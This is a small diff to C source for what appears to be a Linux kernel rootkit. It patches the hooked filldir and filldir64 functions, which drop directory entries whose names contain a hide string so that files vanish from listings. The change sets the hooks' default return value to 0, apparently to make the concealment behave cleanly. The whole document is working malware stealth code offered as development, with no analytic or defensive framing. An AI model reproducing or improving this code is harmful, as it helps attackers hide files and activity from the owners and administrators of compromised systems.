@@ -140,7 +140,7 @@ KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen,
 			 loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -150,7 +150,7 @@ KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir64(void *__buf, const char *name, int namlen,
 			   loff_t offset, u64 ino, unsigned int d_type)
 {
-	int ret = -ENOENT;
+	int ret = 0;
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
